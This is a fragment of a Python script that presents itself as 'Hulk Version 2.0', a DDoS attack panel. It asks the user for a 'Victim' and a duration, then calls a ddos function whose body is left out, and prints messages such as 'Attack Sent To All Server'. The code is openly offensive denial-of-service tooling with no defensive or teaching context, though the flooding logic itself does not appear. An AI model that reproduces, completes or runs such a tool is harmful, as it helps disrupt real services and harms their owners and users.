...
def ddos(target, duration):
    ...
    print(f"Attack Stop. End Time | Total Requests [{request_count}]")

while True:
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system('title HenryNET - DEV // Panel Attack')
    print("""==================================
Hulk Version 2.0 By HenryNET - DEV
==================================""")
    target = input("Victim: ")
    time_limit = int(input("Duration: "))
    print(f'(*_*) Attack Sent To All Server {target} For Time: {time_limit}')
    ddos(target, time_limit)
    print("Attack Stop Try [Enter] Back To Main")
    input()
